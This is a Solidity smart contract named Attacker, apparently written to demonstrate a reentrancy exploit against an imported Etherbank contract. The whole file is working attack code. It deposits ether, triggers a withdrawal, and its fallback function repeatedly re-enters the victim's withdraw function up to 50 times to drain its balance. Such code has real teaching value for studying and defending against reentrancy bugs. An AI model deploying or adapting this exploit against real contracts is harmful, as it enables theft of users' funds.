pragma solidity ^0.4.19;

import "./Etherbank.sol";

contract Attacker{
    Etherbank victim;
    int private counter;
    bool isAttack = false; 

    event Withdrawl(
        address indexed from,
        uint value
    );

    event Deposit(
        address indexed to,
        uint indexed id,
        string value
    );

    constructor(address _etherbank) public {
        victim = Etherbank(_etherbank);
    }

    function deposit() public payable {
        emit Deposit(address(victim), 10, "Deposit");
        victim.deposit.value(msg.value)(tx.origin);
    }


    function attack() public {
        isAttack = true;
        emit Withdrawl(address(victim), 1);
        victim.withdraw(1);
    }

    function getCount() public view returns (int) {
        return counter;
    }

    function getEtherbankAddress() public view returns (Etherbank) {
        return victim;
    }

    function() public payable {
        if(isAttack && counter < 50) {
            emit Withdrawl(msg.sender, 10);
            victim.withdraw(10);
            counter += 1;
        }
        else {
           emit Deposit(msg.sender, msg.value, "Deposit"); 
        }
    }
}